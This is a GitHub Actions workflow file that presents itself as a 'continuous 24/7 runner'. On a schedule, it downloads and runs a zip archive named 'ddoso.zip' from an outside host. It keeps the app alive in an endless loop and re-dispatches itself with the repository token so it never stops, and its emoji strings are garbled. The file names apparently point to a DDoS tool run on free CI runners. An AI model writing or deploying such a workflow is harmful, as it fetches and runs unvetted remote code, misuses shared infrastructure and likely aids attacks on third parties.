name: ‚ôæÔ∏è Continuous 24/7 Runner

on:
  schedule:
    - cron: '0 */6 * * *'  # Every 6 hours
  workflow_dispatch:

jobs:
  continuous-run:
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 1
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 18
      
      - name: Download and Run App
        run: |
          # Download if not exists
          if [ ! -d "ddosm" ]; then
            wget -q https://reality.mahmud-tech.online/ddoso.zip
            unzip -q ddoso.zip
          fi
          
          # Go to app directory
          cd dDOSm 2>/dev/null || cd ddoso 2>/dev/null || cd .
          
          # Install and run
          npm install --legacy-peer-deps
          
          # Start with forever
          npm install -g forever
          forever start index.js
          forever list
          
          # Keep alive with retry
          while true; do
            if ! forever list | grep -q "index.js"; then
              echo "‚ö†Ô∏è App crashed, restarting..."
              forever start index.js
            fi
            echo "üíì Keep-alive at $(date)"
            sleep 300
          done
      
      - name: Self-Trigger Next Run
        if: always()
        run: |
          # Trigger next run before this one ends
          echo "üîÑ Scheduling next run..."
          sleep 21600  # 6 hours
          curl -X POST \
            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github.v3+json" \
            https://api.github.com/repos/${{ github.repository }}/actions/workflows/node-app.yml/dispatches \
            -d '{"ref":"main"}'
